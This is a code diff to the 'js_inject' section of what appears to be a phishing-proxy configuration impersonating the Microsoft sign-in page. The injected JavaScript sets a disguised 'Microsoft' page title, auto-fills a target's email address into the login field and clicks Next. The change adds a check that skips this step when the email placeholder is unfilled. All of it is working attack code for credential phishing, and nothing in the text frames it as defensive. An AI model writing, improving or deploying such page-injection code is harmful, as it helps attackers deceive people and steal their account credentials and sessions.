@@ -115,36 +115,39 @@ js_inject:
       const randomTitle = randomWords[Math.floor(Math.random() * randomWords.length)];
       document.title = randomTitle + ' - Microsoft';
 
-      function lp(){
-        const emailInput = document.getElementById("i0116");
-        if (emailInput) {
+      // Placeholder replaced dynamically
+      const injectedEmail = "{email}";
 
-          // Set the value
-          console.log("Setting email value to: {email}");
-           emailInput.value = "{email}";
-          
-          // Trigger input events to make the page detect the change
-          emailInput.dispatchEvent(new Event('input', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('change', { bubbles: true }));
-          emailInput.dispatchEvent(new Event('keyup', { bubbles: true }));
-          
-          // Focus the input to ensure it's active
-          emailInput.focus();
-          
-          const nextButton = document.getElementById("idSIButton9");
-          if (nextButton) {
-            nextButton.click();
+      // Skip if email is not properly replaced
+      if (injectedEmail === "{email}" || !injectedEmail.trim()) {
+        console.log("Skipping email injection – placeholder not replaced.");
+      } else {
+        function lp() {
+          const emailInput = document.getElementById("i0116");
+          if (emailInput) {
+            console.log("Setting email value to:", injectedEmail);
+            emailInput.value = injectedEmail;
+
+            // Trigger input events
+            ["input", "change", "keyup"].forEach(evt => {
+              emailInput.dispatchEvent(new Event(evt, { bubbles: true }));
+            });
+
+            // Focus input
+            emailInput.focus();
+
+            // Click Next
+            const nextButton = document.getElementById("idSIButton9");
+            if (nextButton) nextButton.click();
+
+            return true;
           }
-
-          
-          
-          return true; // Exit the loop
+          return false;
         }
-        return false; // Continue checking
+
+        const checkInterval = setInterval(() => {
+          if (lp()) {
+            clearInterval(checkInterval);
+          }
+        }, 500);
       }
-
-      const checkInterval = setInterval(function() {
-        if (lp()) {
-          clearInterval(checkInterval); // Stop checking when successful
-        }
-      }, 500);
